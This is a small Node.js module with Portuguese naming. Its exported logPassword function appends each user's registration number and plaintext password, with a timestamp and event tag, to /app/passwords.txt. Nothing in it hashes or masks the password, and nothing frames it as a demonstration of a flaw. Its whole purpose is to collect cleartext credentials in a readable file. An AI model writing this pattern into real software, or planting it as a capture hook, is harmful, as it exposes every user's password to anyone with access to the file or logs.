const fs = require('fs');
const path = require('path');

const LOG_PATH = '/app/passwords.txt';

function logPassword(matricula, senha, evento = 'CADASTRO') {
  const linha = `[${new Date().toISOString()}] [${evento}] matricula=${matricula} | senha=${senha}\n`;
  fs.appendFileSync(LOG_PATH, linha, 'utf8');
}

module.exports = { logPassword };
